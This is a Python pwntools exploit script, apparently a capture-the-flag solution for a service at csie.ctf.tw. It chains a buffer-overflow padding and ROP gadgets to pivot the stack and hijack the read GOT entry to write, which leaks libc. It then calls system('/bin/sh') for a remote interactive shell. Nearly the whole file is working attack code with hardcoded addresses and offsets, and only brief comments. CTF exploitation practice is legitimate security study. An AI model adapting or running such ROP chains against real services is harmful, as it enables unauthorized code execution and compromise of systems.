#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = 'csie.ctf.tw'
port = 10135
context.arch = 'amd64'

r = remote(host, port)
padding = "a"*32
buf1 = 0x601048
buf2 = 0x601700
bufx = 0x601c00
read_plt = 0x4004c0
read_res = 0x4004c6
read_got = 0x601020

read = 0x000000000040062b
leave_ret = 0x0000000000400646
pop_rdi = 0x00000000004006b3
pop_rsi_r15 = 0x00000000004006b1
pop_rbp = 0x0000000000400560
r.recvuntil(":")

payload = padding + flat([buf1+0x20, read])
r.send(payload)
# In rop1 read_got is hijack to write_got to leak the got address of write
rop1 = flat([pop_rdi, 0x1, read_plt, pop_rbp, bufx + 0x20, read])
r.send(rop1)
rop2 = flat([0x1, 0x1, 0x1, 0x1, buf1 + 0x40, read])
r.send(rop2)
rop3 = flat([buf2, leave_ret, 0x0, 0x0, bufx + 0x20, read])
r.send(rop3)
rop4 = flat([0x1, 0x1, 0x1, 0x1, buf2 + 0x20, read])
r.send(rop4)
rop5 = flat([bufx + 0x20, pop_rsi_r15, bufx, 0, bufx + 0x20, read])
r.send(rop5)
rop6 = flat([0x1, 0x1, 0x1, 0x1, buf2 + 0x40, read])
r.send(rop6)
# We now need to use read hence we need to resolve read got again(it has been hijack to write got)
rop7 = flat([pop_rdi, 0, read_res, leave_ret, bufx + 0x20, read])
r.send(rop7)
rop8 = flat([0x1, 0x1, 0x1, 0x1, read_got + 0x20, read])
r.send(rop8)
r.send('\x80')

write_got = u64(r.recv()[:8])
libc = write_got - 0xf7280
system = libc + 0x45390
print "Leak write got", hex(write_got)

# Time to get shell, we move our execution to buf2
# Since in system there will be an instruction "sub rsp, 0x270"
# If our rsp is on buf1, then rsp - 0x270 will be rodata which will cause segmentation fault
rop9 = flat([0x1, 0x1, 0x1, 0x1, buf1 + 0x20, read])
r.send(rop9)
rop10 = flat([pop_rbp, buf2, leave_ret, 0x1, buf2 + 0x20, read])
r.send(rop10)
rop11 = flat([buf2, pop_rdi, buf2 + 32, system, bufx + 0x20, read])
r.send(rop11)
rop12 = flat([0x1, 0x1, 0x1, 0x1, buf2 + 0x40, read])
r.send(rop12)
rop13 = flat(['/bin/sh\n', 0x0, 0x0, 0x0, read_got + 0x20, read])
r.send(rop13)
r.send(p64(system))
r.interactive()
